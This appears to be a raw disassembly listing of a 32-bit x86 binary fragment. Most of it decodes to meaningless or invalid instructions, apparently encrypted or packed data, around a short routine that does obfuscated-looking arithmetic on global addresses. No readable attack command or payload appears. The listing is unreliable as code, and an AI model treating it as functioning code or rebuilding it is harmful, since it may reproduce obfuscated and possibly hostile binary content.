  4094d4:	or     edx,DWORD PTR [ecx-0x4b]
  4094d7:	or     al,0x28
  4094d9:	fst    QWORD PTR [esi+0x6b]
  4094dc:	pusha  
  4094dd:	mov    cl,0x85
  4094df:	sub    ch,ah
  4094e1:	pop    esp
  4094e2:	bound  edi,QWORD PTR ds:0x6c7b4a58
  4094e8:	adc    BYTE PTR ds:0x55cc0800,ch
  4094ee:	stos   DWORD PTR es:[edi],eax
  4094ef:	inc    eax
  4094f0:	push   es
  4094f1:	pop    esp
  4094f2:	xor    BYTE PTR [esi+0x2c167ec0],0x62
  4094f9:	mov    dl,0x9d
  4094fb:	or     BYTE PTR [edx-0x7f68b1a1],bl
  409501:	test   DWORD PTR [esi],ebx
  409503:	sbb    al,0x2a
  409505:	mov    edx,0x800049d6
  40950a:	stc    
  40950b:	loope  0x4094be
  40950d:	adc    BYTE PTR [ebx-0x54],al
  409510:	pop    ds
  409511:	push   eax
  409512:	sub    ah,bh
  409514:	rol    BYTE PTR ds:0x7d3d34da,1
  40951a:	sbb    DWORD PTR [ebx-0x34],ebx
  40951d:	cwde   
  40951e:	out    dx,al
  40951f:	addr16 lahf 
  409521:	pushf  
  409522:	xlat   BYTE PTR ds:[ebx]
  409523:	pop    edx
  409524:	xchg   ebp,eax
  409525:	out    0x46,eax
  409527:	es xor edi,ebp
  40952a:	(bad)  
  40952b:	lock mul ah
  40952e:	into   
  40952f:	xor    al,0x48
  409531:	mov    al,0xc1
  409533:	pop    ds
  409534:	inc    edx
  409535:	xchg   ecx,eax
  409536:	retf   0xdcc6
  409539:	aas    
  40953a:	jg     0x4094fe
  40953c:	test   esp,0x4d5bab
  409542:	add    eax,0xe50ddbef
  409547:	rol    al,1
  409549:	sub    DWORD PTR [esi-0x74],0x266f8fa4
  409550:	xchg   BYTE PTR [ebx-0x6d705290],al
  409556:	xor    ah,BYTE PTR [ebp+0x1d]
  409559:	inc    esp
  40955a:	bound  ecx,QWORD PTR [ebp-0x1550bda7]
  409560:	mov    ch,0x51
  409562:	inc    ecx
  409563:	push   ecx
  409564:	mov    ds:0xe8d47a44,eax
  409569:	mov    DWORD PTR [ecx],ebx
  40956b:	aaa    
  40956c:	lock into 
  40956e:	xor    ecx,ecx
  409570:	test   eax,0x3cc2398c
  409575:	lds    ecx,FWORD PTR [esi-0x3da815c7]
  40957b:	adc    al,0x47
  40957d:	repnz inc esp
  40957f:	sbb    esi,DWORD PTR [edx-0x7cb294d]
  409585:	lock leave 
  409587:	mov    eax,0x9843c344
  40958c:	imul   ebp,DWORD PTR [edi-0x27],0x3d15b22b
  409593:	sub    esp,edx
  409595:	or     dh,bl
  409597:	and    BYTE PTR [ebx],dh
  409599:	daa    
  40959a:	dec    edx
  40959b:	loopne 0x4095a1
  40959d:	iret   
  40959e:	adc    al,0x69
  4095a0:	std    
  4095a1:	fstp   TBYTE PTR [eax+0x10]
  4095a4:	out    0x83,al
  4095a6:	js     0x409571
  4095a8:	pop    esp
  4095a9:	mov    ds:0xe446f437,eax
  4095ae:	adc    DWORD PTR [ecx+ebp*1+0x5f340b23],0x38
  4095b6:	xchg   BYTE PTR [esi],ch
  4095b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b9:	push   ecx
  4095ba:	out    dx,eax
  4095bb:	add    esi,DWORD PTR [edi+0x32]
  4095be:	ror    DWORD PTR [ebx+0x1fdd1411],0x27
  4095c5:	fstp   DWORD PTR [bp+di-0x72]
  4095c9:	addr16 aaa 
  4095cb:	dec    ecx
  4095cc:	inc    esp
  4095cd:	mov    ecx,0xedee3dc
  4095d2:	mov    ds:0x315526a6,eax
  4095d7:	loop   0x409652
  4095d9:	cmc    
  4095da:	xor    BYTE PTR [eax],cl
  4095dc:	(bad)  
  4095dd:	cli    
  4095de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095df:	(bad)  
  4095e0:	lock (bad) 
  4095e2:	xor    al,0x60
  4095e4:	cmc    
  4095e5:	cld    
  4095e6:	(bad)  
  4095e7:	ficomp WORD PTR [eax-0x2adf178c]
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e06:0x9729524e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	into   
  40960d:	scas   eax,DWORD PTR es:[edi]
  40960e:	cmp    DWORD PTR [edx],0xf368c70b
  409614:	outs   dx,DWORD PTR es:[esi]
  409616:	outs   dx,DWORD PTR ds:[esi]
  409617:	push   esi
  409618:	lock lds ebp,FWORD PTR [edx+0x36fbcc26]
  40961f:	rcr    BYTE PTR [ebp-0x409d00f4],cl
  409625:	fnstenv [ebx]
  409627:	pop    edi
  409628:	and    BYTE PTR [edi],bl
  40962a:	std    
  40962b:	jnp    0x4096a8
  40962d:	ja     0x40969b
  40962f:	push   edx
  409630:	ret    
  409631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409632:	shr    DWORD PTR [esi],0xa1
  409635:	cmp    ebx,DWORD PTR [eax-0x2ba46d80]
  40963b:	retf   0x15d
  40963e:	or     BYTE PTR [ebx],ch
  409640:	jle    0x40967f
  409642:	scas   eax,DWORD PTR es:[edi]
  409643:	loope  0x40969d
  409645:	or     bh,bl
  409647:	lea    edi,[esi+0x2eff3b33]
  40964d:	loop   0x409686
  40964f:	push   0x75
  409651:	sti    
  409652:	xor    DWORD PTR [ebx+0x6bda78a9],esp
  409658:	mov    ds:0xf12b5a89,eax
  40965d:	popf   
  40965e:	mov    esi,esp
  409660:	icebp  
  409661:	xchg   DWORD PTR [ecx+0x3b785bdc],eax
  409667:	stos   BYTE PTR es:[edi],al
  409668:	(bad)  
  409669:	fisttp WORD PTR [esi+esi*4+0x2518e3a8]
  409670:	fadd   DWORD PTR [esi]
  409672:	jb     0x40961b
  409674:	lahf   
  409675:	call   0xad4ce618
  40967a:	rcr    BYTE PTR [esi],cl
  40967c:	push   ecx
  40967d:	pop    esi
  40967e:	push   ebp
  40967f:	test   al,0x90
  409681:	jp     0x40968b
  409683:	jecxz  0x4096c8
  409685:	call   0x13a6beed
  40968a:	loop   0x4096cc
  40968c:	dec    ebp
  40968d:	ror    BYTE PTR [edx+0x24],0xbd
  409691:	jmp    0x6e3e:0xa4863d7e
  409698:	xor    BYTE PTR [ecx+eiz*4+0x59],cl
  40969c:	add    dh,BYTE PTR [esi+0x2494e722]
  4096a2:	mov    cl,0x70
  4096a4:	sahf   
  4096a5:	daa    
  4096a6:	inc    ebp
  4096a7:	mov    cl,0x47
  4096a9:	push   ecx
  4096aa:	mov    DWORD PTR [eax],ecx
  4096ac:	pop    ss
  4096ad:	fninit 
  4096af:	push   cs
  4096b0:	jae    0x4096b5
  4096b2:	sbb    DWORD PTR [eax-0x7d62a5f9],0x45
  4096b9:	dec    eax
  4096ba:	loopne 0x40970e
  4096bc:	stc    
  4096bd:	cli    
  4096be:	mov    cl,0xf4
  4096c0:	push   cs
  4096c1:	pusha  
  4096c2:	push   edx
  4096c3:	popf   
  4096c4:	hlt    
  4096c5:	mov    ds:0xe7fc6523,eax
  4096ca:	inc    ebp
  4096cb:	adc    al,0x82
  4096cd:	sub    DWORD PTR [ebx+0x69],esi
  4096d0:	test   DWORD PTR [edi-0x68a04989],edx
  4096d6:	hlt    
  4096d7:	inc    ecx
  4096d8:	xchg   esi,eax
  4096d9:	xchg   esi,eax
  4096da:	push   ds
  4096db:	push   ecx
  4096dc:	push   ds
  4096dd:	clc    
  4096de:	jno    0x4096bc
  4096e0:	repz cdq 
  4096e2:	mov    ebp,0x2f37db57
  4096e7:	mov    ah,0x69
  4096e9:	arpl   WORD PTR [ecx],dx
  4096eb:	dec    ebp
  4096ec:	mov    dl,0x38
  4096ee:	mov    dh,0x3
  4096f0:	mov    ebx,0xffba3832
  4096f5:	cdq    
  4096f6:	and    al,0xaf
  4096f8:	mov    ch,BYTE PTR [esi+ebx*8]
  4096fb:	rcr    BYTE PTR [ecx],0xa6
  4096fe:	mov    BYTE PTR [edx-0x4488a17e],cl
  409704:	add    DWORD PTR ds:0x230155ff,0xffa5a0fd
  40970e:	and    dl,cl
  409710:	sub    esp,DWORD PTR [edi]
  409712:	inc    ebx
  409713:	cli    
  409714:	scas   al,BYTE PTR es:[edi]
  409715:	xor    bl,BYTE PTR [edi]
  409717:	push   ss
  409718:	adc    eax,0x80a0acc3
  40971d:	in     al,0xa0
  40971f:	sbb    al,0x46
  409721:	xchg   ecx,eax
  409722:	icebp  
  409723:	repnz mov bh,0x5b
  409726:	retfw  
  409728:	enter  0x9f88,0xb6
  40972c:	ja     0x40970c
  40972e:	xor    DWORD PTR [ecx],ebx
  409730:	mov    cs,WORD PTR [ebx-0x184076da]
  409736:	ds gs jl 0x4096f6
  40973a:	out    0x14,eax
  40973c:	jmp    0x56dfd4d3
  409741:	pusha  
  409742:	push   esp
  409743:	and    esp,DWORD PTR [esi-0x2c]
  409746:	xchg   ebx,eax
  409747:	fcomp  QWORD PTR [edx]
  409749:	das    
  40974a:	jae    0x409742
  40974c:	out    dx,eax
  40974d:	scas   eax,DWORD PTR es:[edi]
  40974e:	inc    ebx
  40974f:	mov    WORD PTR [ecx+0x32],ds
  409752:	cmp    eax,0x4074c025
  409757:	cmp    edx,edx
  409759:	push   edx
  40975a:	into   
  40975b:	cld    
  40975c:	cwde   
  40975d:	sbb    edi,esi
  40975f:	pop    esi
  409760:	imul   eax,DWORD PTR [edi-0x63567f65],0x4abc5e5c
  40976a:	lods   al,BYTE PTR ds:[esi]
  40976b:	dec    eax
  40976c:	outs   dx,DWORD PTR ds:[esi]
  40976d:	ret    
  40976e:	mov    al,ds:0x46a888f3
  409773:	loopne 0x40974a
  409775:	jle    0x409784
  409777:	mov    al,ds:0x74fd0e47
  40977c:	inc    edx
  40977d:	int    0x1f
  40977f:	sbb    ah,BYTE PTR [edx+edx*8]
  409782:	dec    eax
  409783:	push   0xd802b3fd
  409788:	dec    ebx
  409789:	pop    eax
  40978a:	inc    edi
  40978b:	add    ecx,esi
  40978d:	push   cs
  40978e:	out    dx,eax
  40978f:	xor    BYTE PTR [bx+si+0x3b23],0x7f
  409795:	pop    es
  409796:	mov    ah,0x8a
  409798:	mov    cl,0xa7
  40979a:	jge    0x409728
  40979c:	(bad)  
  40979d:	outs   dx,BYTE PTR ds:[esi]
  40979e:	(bad)  
  40979f:	popa   
  4097a0:	icebp  
  4097a1:	in     al,dx
  4097a2:	test   eax,0x39418a7b
  4097a7:	in     al,dx
  4097a8:	scas   eax,DWORD PTR es:[edi]
  4097a9:	pusha  
  4097aa:	scas   al,BYTE PTR es:[edi]
  4097ab:	jg     0x4097e1
  4097ad:	sti    
  4097ae:	add    eax,0x97efb38a
  4097b3:	mov    esp,0x72b0b10d
  4097b8:	enter  0xe164,0xa0
  4097bc:	push   ebx
  4097bd:	out    dx,eax
  4097be:	jbe    0x76ed0882
  4097c4:	cmp    al,0xa7
  4097c6:	lds    ebp,FWORD PTR [edx-0x10]
  4097c9:	inc    ebp
  4097ca:	popa   
  4097cb:	fdiv   QWORD PTR [edi+0x13e3c8c3]
  4097d1:	or     bl,BYTE PTR [esi+0x5f]
  4097d4:	out    0x3a,al
  4097d6:	jbe    0x40979d
  4097d8:	dec    esp
  4097d9:	in     al,dx
  4097da:	or     ebx,DWORD PTR [ecx-0x66a408af]
  4097e0:	fwait
  4097e1:	pop    ecx
  4097e2:	xchg   bh,al
  4097e4:	dec    esp
  4097e5:	pusha  
  4097e6:	in     al,dx
  4097e7:	stos   BYTE PTR es:[edi],al
  4097e8:	adc    DWORD PTR [ebx],esi
  4097ea:	sub    BYTE PTR [eax+0x2e],0x37
  4097ee:	inc    esp
  4097ef:	(bad)  
  4097f1:	jp     0x4097f4
  4097f3:	and    al,0xa2
  4097f5:	pop    ebp
  4097f6:	imul   esi,DWORD PTR [esp+esi*1-0x67af31],0x4bc16f9
  409801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409802:	sar    DWORD PTR [esi],1
  409804:	pop    esi
  409805:	mov    ecx,0xd72fef5c
  40980a:	jg     0x409872
  40980c:	inc    ebx
  40980d:	mov    esi,0x7014d4a1
  409812:	nop
  409813:	(bad)  
  409815:	dec    ecx
  409816:	inc    edi
  409817:	xchg   ecx,eax
  409818:	sub    ebx,esp
  40981a:	outs   dx,DWORD PTR ds:[esi]
  40981b:	in     al,dx
  40981c:	mov    dh,0x2e
  40981e:	fadd   QWORD PTR [edi+edx*4+0x62]
  409822:	fwait
  409823:	enter  0xda19,0x35
  409827:	mov    ds:0x47165a11,al
  40982c:	in     al,dx
  40982d:	mul    DWORD PTR [edi-0x5f]
  409830:	mov    BYTE PTR [ebx],dl
  409832:	sbb    al,0x6a
  409834:	push   es
  409835:	inc    ebp
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	in     eax,dx
  4098c1:	cs cmp dl,0xb4
  4098c5:	fnstcw WORD PTR [esi+0x7e]
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	sub    ch,BYTE PTR [edi+0x15509929]
  4098d2:	jecxz  0x40994a
  4098d4:	cmp    al,0x88
  4098d6:	xor    eax,0xa8c70a0a
  4098db:	fisub  WORD PTR [edx+0x4207a2d6]
  4098e1:	(bad)  
  4098e2:	faddp  st(2),st
  4098e4:	(bad)  
  4098e5:	sub    al,BYTE PTR [esi]
  4098e7:	jmp    0xdf5240a3
  4098ec:	xchg   BYTE PTR [ecx-0x55fe7617],bh
  4098f2:	mov    eax,0xf1787c31
  4098f7:	(bad)  
  4098f9:	loop   0x409952
  4098fb:	test   al,0xdc
  4098fd:	sub    eax,0xaf5914bc
  409902:	mov    ebx,0x6e1119cb
  409907:	cmp    BYTE PTR [edx],cl
  409909:	stos   DWORD PTR es:[edi],eax
  40990a:	fdivr  DWORD PTR [ebp+0xf6b538]
  409910:	repnz sbb dh,BYTE PTR [ebx]
  409913:	aas    
  409914:	mov    edi,0xf3b1c978
  409919:	add    DWORD PTR [ebx+eax*1],0xffffff9f
  40991d:	call   0x8873:0xb2a7558e
  409924:	sub    al,0xf6
  409926:	ret    
  409927:	mov    edi,0x94cd972f
  40992c:	add    BYTE PTR [esi],0xbc
  40992f:	sub    DWORD PTR [esi-0x2],ecx
  409932:	fwait
  409933:	adc    DWORD PTR [ebx],0xef720844
  409939:	dec    ebx
  40993a:	inc    esi
  40993b:	add    esp,edi
  40993d:	retf   0x2cbe
  409940:	xchg   al,bh
  409942:	dec    edx
  409943:	pop    ebx
  409944:	cmp    edx,eax
  409946:	cmp    ecx,esp
  409948:	mov    cl,0xbe
  40994a:	rcr    DWORD PTR [ecx+0x2d],1
  40994d:	mov    esp,0x1e8489c7
  409952:	ds aam 0xaf
  409955:	scas   eax,DWORD PTR es:[edi]
  409956:	iret   
  409957:	dec    ebp
  409958:	addr16 pop edx
  40995a:	and    eax,0x59ab0ec3
  40995f:	dec    eax
  409960:	and    DWORD PTR [edx],edi
  409962:	mov    edi,0x52b05304
  409967:	pop    ecx
  409968:	fs mov cl,0x27
  40996b:	push   cs
  40996c:	xchg   ebp,eax
  40996d:	xor    DWORD PTR [ebx+0x69],edx
  409970:	loope  0x409949
  409972:	or     DWORD PTR [ebp+0x6f],ecx
  409975:	clc    
  409976:	nop
  409977:	int3   
  409978:	(bad)
  40997b:	adc    cl,BYTE PTR [ebx+0x50]
  40997e:	push   ds
  40997f:	add    eax,0xb38d8331
  409984:	int3   
  409985:	mov    cs,WORD PTR [edi+0x23db1aae]
  40998b:	sar    BYTE PTR [esi],cl
  40998d:	test   DWORD PTR [eax-0x41693ea0],edx
  409993:	loop   0x4099f4
  409995:	iret   
  409996:	add    eax,0x5ac9674
  40999b:	dec    ebp
  40999c:	push   0x56
  40999e:	adc    ebx,edi
  4099a0:	cmp    BYTE PTR [ecx-0x28a15f88],dl
  4099a6:	add    eax,0x2e9b887c
  4099ab:	fldenv [ecx+ebx*8-0x6491077f]
  4099b2:	(bad)  
  4099b3:	mov    ah,0xc2
  4099b5:	loop   0x40996f
  4099b7:	push   0x7a
  4099b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ba:	dec    edx
  4099bb:	mov    DWORD PTR [ebp+0xe],esp
  4099be:	jl     0x4099e0
  4099c0:	jl     0x409952
  4099c2:	jmp    0x9d9333f9
  4099c7:	(bad)  
  4099c8:	into   
  4099c9:	adc    dl,BYTE PTR [esi+eax*4]
  4099cc:	test   BYTE PTR [ebp+0x647a1162],dl
  4099d2:	cmp    BYTE PTR [eax+0x2f],al
  4099d5:	xlat   BYTE PTR ds:[ebx]
  4099d6:	xchg   DWORD PTR [ecx+0x0],esi
  4099d9:	fwait
  4099da:	dec    esi
  4099db:	test   al,0x54
  4099dd:	dec    esi
  4099de:	loope  0x4099dd
  4099e0:	jg     0x40999f
  4099e2:	jmp    0x409a1f
  4099e4:	retf   
  4099e5:	dec    edi
  4099e6:	lea    ebp,[ecx+0x22960f8d]
  4099ec:	mov    ah,0x5f
  4099ee:	repz je 0x4099d9
  4099f1:	mov    esi,0x5af324f7
  4099f6:	jle    0x409a2c
  4099f8:	jb     0x4099e3
  4099fa:	shr    BYTE PTR [ebx-0x5],cl
  4099fd:	arpl   WORD PTR [edx],bx
  4099ff:	(bad)  [esi]
  409a01:	neg    dl
  409a03:	cmp    DWORD PTR [esp+esi*2+0x1d],esi
  409a07:	lods   eax,DWORD PTR ds:[esi]
  409a08:	in     eax,0x9b
  409a0a:	cmp    DWORD PTR [ecx+0x3a],edx
  409a0d:	jmp    0x409a29
  409a0f:	sub    ebx,ebx
  409a11:	jmp    0x46b2:0x9a0f5bf9
  409a18:	inc    ecx
  409a19:	cdq    
  409a1a:	ret    0x448e
  409a1d:	push   cs
  409a1e:	adc    dl,BYTE PTR [edx+0x7]
  409a21:	outs   dx,BYTE PTR ds:[esi]
  409a22:	jmp    FWORD PTR [ecx+0x43]
  409a25:	sub    ebp,DWORD PTR ss:[ecx+0x4c59c963]
  409a2c:	fisub  DWORD PTR [edi-0x1b154a0b]
  409a32:	mov    eax,0x99d3b89a
  409a37:	xchg   esp,eax
  409a38:	cmp    eax,0x9b1c68bc
  409a3d:	std    
  409a3e:	(bad)  
  409a3f:	xlat   BYTE PTR ds:[ebx]
  409a40:	push   ebx
  409a41:	sti    
  409a42:	rcl    DWORD PTR [ecx],0xdf
  409a45:	ds js  0x409a1d
  409a48:	xchg   ecx,eax
  409a49:	xor    eax,0x4f4d4b97
  409a4e:	aaa    
  409a4f:	iret   
  409a50:	xchg   ebx,eax
  409a51:	xchg   ebx,eax
  409a52:	cmp    ah,ch
  409a54:	fcomi  st,st(2)
  409a56:	pop    edx
  409a57:	or     al,0x17
  409a59:	inc    ebx
  409a5a:	cmp    esp,DWORD PTR [esi+edx*1]
  409a5d:	xchg   ebp,eax
  409a5e:	fldenv [ebx]
  409a60:	fwait
  409a61:	js     0x409a8d
  409a63:	xchg   edi,eax
  409a64:	sbb    DWORD PTR [eax],esp
  409a66:	jge    0x409a42
  409a68:	sub    BYTE PTR [ecx+0x5b],dl
  409a6b:	das    
  409a6c:	lods   eax,DWORD PTR ds:[esi]
  409a6d:	in     al,dx
  409a6e:	mov    ebp,ds
  409a70:	jecxz  0x409a8f
  409a72:	sbb    eax,0x817bef40
  409a77:	(bad)  
  409a78:	imul   ebp,ebx,0xffffffd6
  409a7b:	mov    ebx,0x12926c2f
  409a80:	outs   dx,DWORD PTR ds:[esi]
  409a81:	add    BYTE PTR [esi],cl
  409a83:	or     bl,BYTE PTR [eax]
  409a85:	push   esp
  409a86:	inc    eax
  409a87:	cs adc eax,0x9463586b
  409a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a8e:	outs   dx,BYTE PTR ds:[esi]
  409a8f:	stos   DWORD PTR es:[edi],eax
  409a90:	adc    edx,DWORD PTR [edi-0x1b]
  409a93:	fistp  DWORD PTR [edx-0x48]
  409a96:	pop    edx
  409a97:	aam    0x1b
  409a99:	in     al,dx
  409a9a:	cdq    
  409a9b:	pop    edx
  409a9c:	outs   dx,BYTE PTR ds:[esi]
  409a9d:	shl    ebx,1
  409a9f:	(bad)  
  409aa0:	mov    ecx,0xb78b2037
  409aa5:	mov    esi,esi
  409aa7:	push   esi
  409aa8:	cmp    eax,0x65ed9b9c
  409aad:	(bad)  
  409aae:	fcmovbe st,st(3)
  409ab0:	and    ah,BYTE PTR [edx-0x6f]
  409ab3:	test   edx,edx
  409ab5:	lods   eax,DWORD PTR ds:[esi]
  409ab6:	sbb    edx,DWORD PTR [esi+edi*2-0x6da1fa77]
  409abd:	jbe    0x409b00
  409abf:	out    0x7,al
  409ac1:	jns    0x409afb
  409ac3:	lock sbb bh,BYTE PTR [eax+0x22]
  409ac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ac8:	xchg   esi,eax
  409ac9:	inc    esp
  409aca:	mov    ds:0x424bf9f6,eax
  409acf:	cmp    al,BYTE PTR [eax+0x449bdb39]
  409ad5:	or     BYTE PTR [ebx+0x4d],dh
  409ad8:	inc    ebp
  409ad9:	mov    dh,0xca
  409adb:	xor    ebp,eax
  409add:	mov    dl,0x9a
  409adf:	or     BYTE PTR [edi+ebx*4+0x2d],bh
  409ae3:	aam    0x32
  409ae5:	pop    ecx
  409ae6:	adc    BYTE PTR [ecx-0x3a221997],ch
  409aec:	jno    0x409aba
  409aee:	stc    
  409aef:	mov    DWORD PTR [edx+0xa],esi
  409af2:	mov    ecx,0xd48b46cd
  409af7:	ss loop 0x409ad1
  409afa:	imul   ebp,DWORD PTR [esi+eax*1],0x4af6d76e
  409b01:	push   0x3f98e2b4
  409b06:	sbb    eax,0x4cce311c
  409b0b:	cmc    
  409b0c:	adc    al,0x89
  409b0e:	(bad)  
  409b0f:	out    0x70,eax
  409b11:	xlat   BYTE PTR ds:[ebx]
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43379f,0x433753
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x1f10acd4]
  409b32:	lods   al,BYTE PTR ds:[esi]
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	fisubr WORD PTR [ebx-0x4826395f]
  409b41:	repnz test ecx,ebp
  409b44:	sbb    al,0x89
  409b46:	pop    ds
  409b47:	cmc    
  409b48:	inc    edi
  409b49:	mov    cl,0xac
  409b4b:	xor    DWORD PTR [edx+0x152c73d3],eax
  409b51:	sub    al,0x89
  409b53:	(bad)  
  409b54:	jno    0x409b41
  409b56:	jnp    0x409b6b
  409b58:	cmp    al,0xac
  409b5a:	or     eax,0x5803ab9a
  409b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b60:	xchg   ecx,eax
  409b61:	add    BYTE PTR [ecx+0x73],dh
  409b64:	xchg   dh,dh
  409b66:	cli    
  409b67:	mov    bl,0x74
  409b69:	pop    ebp
  409b6a:	push   ds
  409b6b:	jle    0x409b9f
  409b6d:	inc    esi
  409b6e:	pop    ecx
  409b6f:	idiv   BYTE PTR [eax+esi*8+0x6d2506d7]
  409b76:	and    eax,0xff977194
  409b7b:	gs inc ecx
  409b7d:	sub    bl,BYTE PTR cs:[esi-0x6a78dda9]
  409b84:	xchg   DWORD PTR [esi+0x1b8da677],ebx
  409b8a:	xchg   esp,eax
  409b8b:	push   ebx
  409b8c:	cmp    dh,dl
  409b8e:	mul    DWORD PTR [edx]
  409b90:	jbe    0x409bda
  409b92:	test   al,0x10
  409b94:	arpl   sp,bp
  409b96:	loop   0x409bd3
  409b98:	lods   al,BYTE PTR ds:[esi]
  409b99:	sub    BYTE PTR [edx],0xf8
  409b9c:	mov    edi,0x22f2aac0
  409ba1:	(bad)  
  409ba2:	test   BYTE PTR [esi],cl
  409ba4:	fwait
  409ba5:	ss push sp
  409ba8:	pushf  
  409ba9:	mov    ch,0xc6
  409bab:	jl     0x409bdf
  409bad:	jl     0x409be2
  409baf:	hlt    
  409bb0:	shr    BYTE PTR [ebx+0x49],cl
  409bb3:	aam    0x2c
  409bb5:	stos   BYTE PTR es:[edi],al
  409bb6:	xor    BYTE PTR [ecx+0xd],0xa9
  409bba:	pop    eax
  409bbb:	mov    BYTE PTR [esp+ebp*8-0x2b0db448],ch
  409bc2:	adc    BYTE PTR [esi+0x6a1ad2fb],dh
  409bc8:	inc    ebp
  409bc9:	not    ch
  409bcb:	cmp    BYTE PTR [ebp+eax*8-0x44],bh
  409bcf:	pop    ebx
  409bd0:	mov    ecx,0x16ad2388
  409bd5:	in     eax,0x69
  409bd7:	inc    esp
  409bd8:	adc    BYTE PTR [edi],ch
  409bda:	add    eax,0x739ea888
  409bdf:	jbe    0x409b9a
  409be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be2:	fist   WORD PTR [eax]
  409be4:	and    bh,dl
  409be6:	(bad)  [ecx]
  409be8:	nop
  409be9:	test   DWORD PTR [edx+0x69],0x27cd44ce
  409bf0:	in     al,0x8
  409bf2:	jbe    0x409c37
  409bf4:	dec    esi
  409bf5:	push   edi
  409bf6:	rcl    ah,0xd6
  409bf9:	leave  
  409bfa:	mov    dl,0xb6
  409bfc:	sub    BYTE PTR [ecx+0x4f6c6c0f],bl
  409c02:	and    esp,eax
  409c04:	xor    esp,DWORD PTR [edi+0x7e]
  409c07:	xchg   edx,eax
  409c08:	das    
  409c09:	shl    BYTE PTR [esi],cl
  409c0b:	(bad)  
  409c0c:	jmp    0x409c5c
  409c0e:	jns    0x409c08
  409c10:	mov    edx,0x83201d61
  409c15:	fwait
  409c16:	xor    bl,BYTE PTR [ebp-0x9b3943e]
  409c1c:	push   0xffffffc6
  409c1e:	and    eax,0x1aaaaac3
  409c23:	mov    ds:0xa6d2ef23,al
  409c28:	les    eax,FWORD PTR [ebx-0x64]
  409c2b:	cmp    DWORD PTR [esi-0x31],ebp
  409c2e:	pop    esi
  409c2f:	test   al,0x4b
  409c31:	inc    ecx
  409c32:	out    0x27,al
  409c34:	mov    bl,0xac
  409c36:	and    bh,ah
  409c38:	test   eax,0x432933a3
  409c3d:	or     ch,BYTE PTR [esp+ecx*8+0x5b]
  409c41:	jp     0x409c08
  409c43:	aam    0x52
  409c45:	in     al,dx
  409c46:	mov    eax,fs:0x251eb727
  409c4c:	dec    ebx
  409c4d:	pop    esp
  409c4e:	loope  0x409c10
  409c50:	dec    eax
  409c51:	aas    
  409c52:	and    DWORD PTR [eax-0x43],0xffffffff
  409c56:	retf   0xf021
  409c59:	imul   esi,edx,0xf12bff0f
  409c5f:	rcl    ebx,cl
  409c61:	std    
  409c62:	sahf   
  409c63:	stos   DWORD PTR es:[edi],eax
  409c64:	mov    bh,BYTE PTR [eax]
  409c66:	jge    0x409c10
  409c68:	mov    dh,0x5f
  409c6a:	mov    ecx,0xfafd3e5d
  409c6f:	icebp  
  409c70:	mov    ds:0x87e05a11,eax
  409c75:	rcl    BYTE PTR [ebx-0x7a6ffe0a],0x9b
  409c7c:	mov    ecx,0x4d5343de
  409c81:	rcr    BYTE PTR [eax-0x1],cl
  409c84:	mov    ds:0xcdf6d893,eax
  409c89:	sbb    ecx,DWORD PTR [edx]
  409c8b:	call   0x7aa664f1
  409c90:	cs call 0x1948:0x82983e88
  409c98:	adc    dh,BYTE PTR [ebp-0x1332f3eb]
  409c9e:	loope  0x409cf5
  409ca0:	js     0x409c3e
  409ca2:	jae    0x409c3d
  409ca4:	xchg   ebx,eax
  409ca5:	enter  0x61e0,0x6d
  409ca9:	mov    ds:0xe150527d,al
  409cae:	fst    st(7)
  409cb0:	in     eax,dx
  409cb1:	lds    ecx,FWORD PTR [ebp+0x61]
  409cb4:	ret    
  409cb5:	or     al,0x62
  409cb7:	cmc    
  409cb8:	or     al,BYTE PTR [edi+0x4e7f2628]
  409cbe:	loope  0x409c97
  409cc0:	add    eax,0x7469467f
  409cc5:	pushf  
